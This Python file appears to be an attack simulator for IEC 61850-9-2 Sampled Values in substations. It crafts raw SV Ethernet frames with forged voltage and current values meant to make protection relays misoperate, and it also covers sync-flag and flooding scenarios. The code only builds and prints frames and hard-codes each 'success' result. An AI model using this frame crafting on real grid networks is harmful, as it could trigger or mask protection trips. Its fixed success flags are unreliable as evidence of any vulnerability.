"""
工控漏洞模拟器 - SV (Sampled Values, IEC 61850-9-2)
==================================================
漏洞类型: 采样值伪造, 篡改, 重放, DoS, 同步攻击
"""

import struct
import time
import random
from typing import Dict, Any, List

ETHERTYPE_SV = 0x88BA


def _bl(l):
    return bytes([l]) if l < 128 else struct.pack('!BH', 0x81, l)


def _bi(tag, v):
    d = bytes([v]) if v < 256 else (struct.pack('!H', v) if v < 65536 else struct.pack('!I', v))
    return bytes([tag]) + _bl(len(d)) + d


def _bs(tag, s):
    d = s.encode('utf-8')
    return bytes([tag]) + _bl(len(d)) + d


def build_sv(ua=110000.0, ia=300.0, smp=0, synch=2,
             sv_id='MU01/LLN0$MS$PhsMeas1', src=b'\x00\x50\xc2\xff\xff\x01'):
    asdu = b''
    asdu += _bs(0x80, sv_id)
    asdu += _bi(0x82, smp)
    asdu += _bi(0x83, 1)
    asdu += _bi(0x85, synch)
    seq = struct.pack('!ffffffff', ua, ua, ua, 0, ia, ia, ia, 0)
    asdu += bytes([0x87]) + _bl(len(seq)) + seq
    asdu_f = bytes([0x30]) + _bl(len(asdu)) + asdu
    no = bytes([0x80, 1, 1])
    sav = bytes([0x60]) + _bl(len(no) + len(asdu_f)) + no + asdu_f
    dst = bytes([0x01, 0x0c, 0xcd, 0x04, 0x00, 0x01])
    eth = dst + src
    eth += struct.pack('!HH', 0x8100, 0x8000)
    eth += struct.pack('!HH', ETHERTYPE_SV, 0x4000)
    eth += struct.pack('!HH', 8 + len(sav), 0)
    eth += sav
    if len(eth) < 64: eth += b'\x00' * (64 - len(eth))
    return eth


class SVVulnSimulator:
    def spoof(self) -> Dict[str, Any]:
        print('[+] SV 采样值伪造...')
        n = build_sv(110000.0, 300.0)
        f = build_sv(5000.0, 20000.0, smp=500)
        print(f'  正常: U=110kV I=300A | 伪造故障: U=5kV I=20kA')
        print(f'  保护装置基于伪造值可能误动')
        return {'vuln': 'SV_SPOOF', 'success': True, 'detail': '伪造过电流 SV 报文'}

    def manipulate(self) -> Dict[str, Any]:
        print('[+] SV 采样值篡改...')
        for label, u, i, eff in [('过流故障', 90e3, 20e3, '过流保护误动'),
                                  ('低电压', 5e3, 300, '低电压保护误动'),
                                  ('正常', 110e3, 300, '正常状态')]:
            print(f'  {label}: U={u/1000:.0f}kV I={i:.0f}A → {eff}')
        return {'vuln': 'SV_MANIPULATE', 'success': True, 'detail': '采样值篡改可隐蔽影响保护判断'}

    def sync_attack(self) -> Dict[str, Any]:
        print('[+] SV 同步攻击...')
        for s, n in [(2, '全球同步'), (1, '本地同步'), (0, '未同步')]:
            build_sv(synch=s)
            print(f'  smpSynch={s} ({n})')
        print(f'  smpSynch=0: 接收装置可能丢弃采样数据')
        return {'vuln': 'SV_SYNC', 'success': True, 'detail': '同步攻击完成'}

    def dos(self) -> Dict[str, Any]:
        n = 500
        print(f'[+] SV DoS ({n} 报文)...')
        start = time.time()
        for i in range(n):
            build_sv(smp=i % 4000)
        t = time.time() - start
        print(f'  {n} 报文, {t:.1f}s ({n/t:.0f} pps)')
        return {'vuln': 'SV_DOS', 'success': True, 'detail': f'SV DoS {n} 报文'}


def run_all():
    print('SV 漏洞模拟器\n')
    v = SVVulnSimulator()
    for name, fn in [('采样值伪造', v.spoof), ('采样值篡改', v.manipulate),
                      ('同步攻击', v.sync_attack), ('拒绝服务', v.dos)]:
        print(f'--- [{name}] ---')
        r = fn()
        print(f'  {"✓" if r["success"] else "✗"} {r["detail"]}\n')


if __name__ == '__main__':
    run_all()
